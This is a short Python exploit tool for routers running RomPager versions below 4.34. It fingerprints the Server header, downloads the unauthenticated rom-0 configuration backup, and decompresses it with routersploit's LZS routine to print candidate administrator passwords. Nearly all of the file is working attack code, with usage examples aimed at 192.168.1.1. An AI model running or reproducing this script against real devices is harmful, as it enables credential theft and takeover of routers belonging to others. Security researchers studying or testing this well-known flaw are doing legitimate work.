#!/usr/bin/python3
#Author: Athul Prakash NJ, aka psychoSherlock
#Date: October 23 2022

from routersploit.libs.lzs.lzs import LZSDecompress
import requests
import re
import sys

def check_vuln(url):
    h = requests.get(f'{url}').headers
    serverName = h["Server"].split(' ')[0].split('/')[0]
    serverVersion = h["Server"].split(' ')[0].split('/')[1]
    return serverName.lower() == "rompager" and float(serverVersion) < 4.34

def get_rom(url):
    print('Downloding..')
    r = requests.get(f'{url}/rom-0')
    with open('rom-0', 'wb') as f:
        f.write(r.content)
        print('Saved as: rom-0')
    
    return 'rom-0'


def extract_password(data):
    fpos = 8568
    result, window=LZSDecompress(data[fpos:])
    print('Decompression in progress...')
    

    q = re.findall("([\040-\176]{5,})", result)
    print("Possible passwords:")
    for i in range(len(q)):
        print(q[i])


if __name__ == "__main__":
    if sys.argv[1]=="help":
        print("""
        Usage: 
            python3 decryptor.py get "http://192.168.1.1"
            python3 decryptor.py decrypt <FILENAME>
            pyhton3 decryptor.py check "http://192.168.1.1"
        """)
        pass
    elif sys.argv[1]=="get":
        get_rom(sys.argv[2])
    elif sys.argv[1]=="decrypt":
        if sys.argv[2]:
            fname = sys.argv[2]
        with open(fname, 'rb') as f:
            extract_password(f.read())
    elif sys.argv[1] == "check":
        if check_vuln(sys.argv[2]):
            print(f"{sys.argv[2]} is VULNERABLE")
        else:
            print(f"{sys.argv[2]} is NOT VULNERABLE")

    else:
        print("""
            python3 decryptor.py --help  FOR USAGE
        """)
